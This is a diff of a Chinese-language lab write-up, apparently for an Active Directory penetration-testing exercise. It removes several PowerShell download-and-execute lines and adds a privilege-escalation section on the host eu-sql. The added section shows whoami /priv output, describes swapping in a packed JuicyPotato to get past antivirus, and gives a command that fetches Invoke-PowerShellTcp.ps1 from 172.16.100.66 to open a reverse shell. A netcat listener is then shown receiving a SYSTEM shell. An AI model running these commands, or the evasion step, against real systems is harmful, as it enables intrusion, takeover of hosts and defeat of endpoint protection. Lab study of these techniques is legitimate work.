@@ -2716,25 +2716,7 @@ nt authority\network service
 PS C:\Windows\system32> hostname
 eu-sql
 ```
-
-
-
-iex (iwr http://172.16.100.66/JuicyPotato.ps1 -UseBasicParsing)
-
-iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
-
-iex (iwr http://172.16.100.66/PowerView_dev.ps1 -UseBasicParsing)
-
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.100.66/JuicyPotato.exe','C:\users\public\downloads\JuicyPotato.exe')"
-
-
-powershell -c .\JuicyPotato.exe -l 4433 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://172.16.100.66/Invoke-PowerShellTcp.ps1')" -t *
-
-
-$data = (New-Object System.Net.WebClient).DownloadData('http://172.16.100.66/JuicyPotato.exe')
-$assem = [System.Reflection.Assembly]::load($data)
-[rev.Program]::Main()
-
+## 提权
 
 枚举eurocorp.local里面的所有域
 ```
@@ -2799,4 +2781,46 @@ MemberName   : Administrator
 MemberSID    : S-1-5-21-2745303235-1478049046-1952051811-500
 IsGroup      : False
 MemberDN     : CN=Administrator,CN=Users,DC=eu,DC=eurocorp,DC=local
+```
+
+
+这边查询到当前账号有SeImpersonatePrivilege的能力，可以使用JuicyPotato提权
+```
+Kerberos support for Dynamic Access Control on this device has been disabled.
+PS C:\users\public\downloads> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+
+但是每次JuicyPotato传过去都会被杀掉，然后搞了好久，后面去OSED备考群里问红队大佬有没有思路，大佬给了一个加壳的JuicyPotato，可以成功执行！
+
+```
+.\LTD.exe -l 4433 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://172.16.100.66/Invoke-PowerShellTcp.ps1')" -t *
+```
+
+收到system权限的shell
+```
+PS C:\ad> .\nc.exe -lnvp 4433
+listening on [any] 4433 ...
+connect to [172.16.100.66] from (UNKNOWN) [172.16.15.17] 50372
+Windows PowerShell running as user EU-SQL$ on EU-SQL
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+eu-sql
+PS C:\Windows\system32>
 ```
